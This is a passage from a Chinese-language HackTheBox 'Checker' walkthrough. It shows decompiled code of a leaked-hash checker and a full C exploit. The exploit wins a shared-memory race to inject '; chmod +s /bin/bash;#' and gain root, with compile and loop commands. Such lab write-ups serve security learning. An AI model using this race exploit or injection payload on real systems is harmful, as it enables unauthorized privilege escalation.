68\ndrwxr-xr-x 2 root root  4096 Jan 30 17:09 .\ndrwxr-xr-x 5 root root  4096 Jan 30 17:04 ..\n-r-------- 1 root root   118 Jan 30 17:07 .<span class=\"hljs-built_in\">env</span>\n-rwxr--r-- 1 root root   141 Jan 30 17:04 check-leak.sh\n-rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak\n-rwx------ 1 root root   750 Jan 30 17:07 cleanup.sh\n-rw-r--r-- 1 root root  1464 Jan 30 17:09 leaked_hashes.txt\n</code></pre>\n<p>查看<code>check-leak.sh</code></p>\n<pre><code class=\"hljs language-bash\">reader@checker:/opt/hash-checker$ <span class=\"hljs-built_in\">cat</span> check-leak.sh \n<span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-built_in\">source</span> `<span class=\"hljs-built_in\">dirname</span> <span class=\"hljs-variable\">$0</span>`/.env\nUSER_NAME=$(/usr/bin/echo <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>\"</span> | /usr/bin/tr -dc <span class=\"hljs-string\">'[:alnum:]'</span>)\n/opt/hash-checker/check_leak <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$USER_NAME</span>\"</span>\n</code></pre>\n<p>将<code>check_leak</code>拉出来分析</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  const char *v3; // rdx\n  unsigned int v5; // [rsp+14h] [rbp-3Ch]\n  char *v6; // [rsp+18h] [rbp-38h]\n  char *v7; // [rsp+20h] [rbp-30h]\n  char *v8; // [rsp+28h] [rbp-28h]\n  char *v9; // [rsp+30h] [rbp-20h]\n  char *s; // [rsp+40h] [rbp-10h]\n  void *ptr; // [rsp+48h] [rbp-8h]\n\n  v6 = getenv(<span class=\"hljs-string\">\"DB_HOST\"</span>);\n  v7 = getenv(<span class=\"hljs-string\">\"DB_USER\"</span>);\n  v8 = getenv(<span class=\"hljs-string\">\"DB_PASSWORD\"</span>);\n  v9 = getenv(<span class=\"hljs-string\">\"DB_NAME\"</span>);\n  <span class=\"hljs-keyword\">if</span> ( *(_BYTE *)(((unsigned __int64)(argv + <span class=\"hljs-number\">1</span>) >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n    __asan_report_load8(argv + <span class=\"hljs-number\">1</span>);\n  s = (char *)argv[<span class=\"hljs-number\">1</span>];\n  if ( !v6 || !v7 || !v8 || !v9 )\n  {\n    if ( *(_BYTE *)(((unsigned __int64)&#x26;stderr >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n      __asan_report_load8(&#x26;stderr);\n    fwrite(\"Error: Missing database credentials in environment\\n\", <span class=\"hljs-number\">1</span>uLL, <span class=\"hljs-number\">0</span>x33uLL, stderr);\n    __asan_handle_no_return();\n    exit(<span class=\"hljs-number\">1</span>);\n  }\n  if ( argc != <span class=\"hljs-number\">2</span> )\n  {\n    if ( *(_BYTE *)(((unsigned __int64)argv >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n      __asan_report_load8(argv);\n    v3 = *argv;\n    if ( *(_BYTE *)(((unsigned __int64)&#x26;stderr >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n      __asan_report_load8(&#x26;stderr);\n    fprintf(stderr, \"Usage: %s &#x3C;USER>\\n\", v3);\n    __asan_handle_no_return();\n    exit(<span class=\"hljs-number\">1</span>);\n  }\n  if ( !s )\n    goto LABEL_40;\n  if ( *(_BYTE *)(((unsigned __int64)s >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) != <span class=\"hljs-number\">0</span>\n    &#x26;&#x26; ((unsigned __int8)s &#x26; <span class=\"hljs-number\">7</span>) >= *(_BYTE *)(((unsigned __int64)s >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n  {\n    __asan_report_load1(s);\n  }\n  if ( !*s )\n  {\nLABEL_40:\n    if ( *(_BYTE *)(((unsigned __int64)&#x26;stderr >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n      __asan_report_load8(&#x26;stderr);\n    fwrite(\"Error: &#x3C;USER> is not provided.\\n\", <span class=\"hljs-number\">1</span>uLL, <span class=\"hljs-number\">0</span>x1FuLL, stderr);\n    __asan_handle_no_return();\n    exit(<span class=\"hljs-number\">1</span>);\n  }\n  if ( strlen(s) > <span class=\"hljs-number\">0</span>x14 )\n  {\n    if ( *(_BYTE *)(((unsigned __int64)&#x26;stderr >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n      __asan_report_load8(&#x26;stderr);\n    fwrite(\"Error: &#x3C;USER> is too long. Maximum length is <span class=\"hljs-number\">20</span> characters.\\n\", <span class=\"hljs-number\">1</span>uLL, <span class=\"hljs-number\">0</span>x3CuLL, stderr);\n    __asan_handle_no_return();\n    exit(<span class=\"hljs-number\">1</span>);\n  }\n  ptr = (void *)fetch_hash_from_db(v6, v7, v8, v9, s);\n  if ( ptr )\n  {\n    if ( (unsigned __int8)check_bcrypt_in_file(\"/opt/hash-checker/leaked_hashes.txt\", ptr) )\n    {\n      puts(\"Password is leaked!\");\n      if ( *(_BYTE *)(((unsigned __int64)&#x26;edata >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n        __asan_report_load8(&#x26;edata);\n      fflush(edata);\n      v5 = write_to_shm(ptr);\n      printf(\"Using the shared memory <span class=\"hljs-number\">0</span>x%X as temp location\\n\", v5);\n      if ( *(_BYTE *)(((unsigned __int64)&#x26;edata >> <span class=\"hljs-number\">3</span>) + <span class=\"hljs-number\">0</span>x7FFF8000) )\n        __asan_report_load8(&#x26;edata);\n      fflush(edata);\n      sleep(<span class=\"hljs-number\">1</span>u);\n      notify_user(v6, v7, v8, v9, v5);\n      clear_shared_memory(v5);\n    }\n    else\n    {\n      puts(\"User is safe.\");\n    }\n    free(ptr);\n  }\n  else\n  {\n    puts(\"User not found in the database.\");\n  }\n  return <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p>exp（佬提供：<code>Telegram : @PAINNNN_21</code> <code>Discord ID : pain._.05</code>）</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\">#include &#x3C;stdio.h></span>\n<span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n<span class=\"hljs-comment\">#include &#x3C;sys/ipc.h></span>\n<span class=\"hljs-comment\">#include &#x3C;sys/shm.h></span>\n<span class=\"hljs-comment\">#include &#x3C;time.h></span>\n<span class=\"hljs-comment\">#include &#x3C;errno.h></span>\n<span class=\"hljs-comment\">#include &#x3C;string.h></span>\n\n<span class=\"hljs-comment\">#define SHM_SIZE 0x400   // 1024 bytes</span>\n<span class=\"hljs-comment\">#define SHM_MODE 0x3B6   // Permissions: 0666 in octal</span>\n\nint main(void) {\n    // Seed the random number generator with the current <span class=\"hljs-keyword\">time</span>.\n    time_t current_time = <span class=\"hljs-keyword\">time</span>(NULL);\n    srand((unsigned int)current_time);\n\n    // Generate a random number and apply modulo <span class=\"hljs-number\">0</span>xfffff to generate the key.\n    int random_value = rand();\n    key_t key = random_value % <span class=\"hljs-number\">0</span>xfffff;\n\n    // Print the generated key in hexadecimal.\n    printf(\"Generated key: <span class=\"hljs-number\">0</span>x%X\\n\", key);\n\n    // Create (or get) the shared memory segment with the generated key.\n    // IPC_CREAT flag is used to create the segment if it does not exist.\n    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | SHM_MODE);\n    if (shmid == -<span class=\"hljs-number\">1</span>) {\n        perror(\"shmget\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Attach to the shared memory segment.\n    char *shmaddr = (char *)shmat(shmid, NULL, <span class=\"hljs-number\">0</span>);\n    if (shmaddr == (char *)-<span class=\"hljs-number\">1</span>) {\n        perror(\"shmat\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Define the payload string to be written.\n    const char *payload = \"Leaked hash detected at Sat Feb <span class=\"hljs-number\">26</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">48</span> <span class=\"hljs-number\">2025</span> > '; chmod +s /bin/bash;#\";\n\n    // Write the payload to the shared memory segment.\n    snprintf(shmaddr, SHM_SIZE, \"%s\", payload);\n\n    // Optionally, print the content that was written.\n    printf(\"Shared Memory Content:\\n%s\\n\", shmaddr);\n\n    // Detach from the shared memory segment.\n    if (shmdt(shmaddr) == -<span class=\"hljs-number\">1</span>) {\n        perror(\"shmdt\");\n        exit(EXIT_FAILURE);\n    }\n\n    return <span class=\"hljs-number\">0</span>;\n}\n\n</code></pre>\n<p>开启两个<code>ssh</code>窗口</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image25.png\" alt=\"image.png\"></p>\n<p>然后上传exp <code>fuzzer.c</code> 并编译</p>\n<pre><code class=\"hljs language-bash\">gcc fuzzer.c -o fuzzer\n<span class=\"hljs-built_in\">chmod</span> +x fuzzer\n</code></pre>\n<p>编译后在一个窗口执行循环，一个窗口执行<code>check-leak.sh</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">true</span>;<span class=\"hljs-keyword\">do</span> ./fuzzer; <span class=\"hljs-keyword\">done</span>\n</code></pre>\n<p>执行<code>check-leak.sh</code> 后，会有一秒在某块内存上可写的，并且最后会通过<code>popen</code>来执行那块内存上代码，通过循环条件竞争，将<code>payload</code>覆盖到将要执行的内存上，覆盖后，<code>popen</code>执行<code>chmod +s /bin/bash</code> ，即可获得<code>root</code>权限</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image26.png\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>任意文件读取双因子登录的相关的密钥和配置信息。提权是通过逆向分析找到漏洞触发任意代码执行（不会RE看着就是一脸懵）</p>","title":"HackTheBox - Season7-Checker","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","Linux靶机"],"categories":"靶机","description":"Season7-Checker\n\n https://app.hackthebox.com/competitive/7/overview | `hard`\n \n\n前期踩点\n\n首先将`checker.htb`添加到`hosts`文件\n\n\n\n\n\n\n\n访问`10.10.11.56:8080`端口回会加载`vault.checker.htb`将写入`hosts`文件\n\n扫描子域名，无结果（但是其实会返回`4..."},"recentPosts":[{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"}]},"__N_SSG":true}